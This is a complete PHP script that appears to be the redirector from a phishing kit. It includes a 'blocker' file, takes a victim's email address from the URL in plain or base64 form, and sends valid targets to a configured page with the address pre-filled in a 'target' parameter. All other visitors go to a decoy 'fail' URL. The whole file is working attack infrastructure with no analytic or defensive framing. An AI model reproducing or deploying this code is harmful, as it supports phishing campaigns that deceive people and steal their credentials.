 <?php

error_reporting(0);include('blocker.php');include('config.php');

preg_match("/[^\/]+$/", $_SERVER[ "REQUEST_URI" ], $matches);
$data = $matches[0];
if ( base64_encode(base64_decode($data)) === $data){

    
  // Remove all illegal characters from email
$email = filter_var(base64_decode($data), FILTER_SANITIZE_EMAIL);

// Validate e-mail
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    if($redirecttype==1 || $redirecttype=='1'){
header("Location: ".$FailRedirect);        
    }else{
echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";        
    }
die();
} else {
    $email = $data;
}

} else if(filter_var($data, FILTER_VALIDATE_EMAIL)) {
    $email = base64_encode($data);

} else {
    if($redirecttype==1 || $redirecttype=='1'){
        header("Location: ".$FailRedirect);
    }else{
        echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";
    }
die();
}


    if($redirecttype==1 || $redirecttype=='1'){
        header("Location: ".$pagelink."/?target=".$email);
    }else{
        echo "<script type=\"text/javascript\">window.location.href = \"$pagelink/?target=$email\"</script>\n";
    }
die();

?>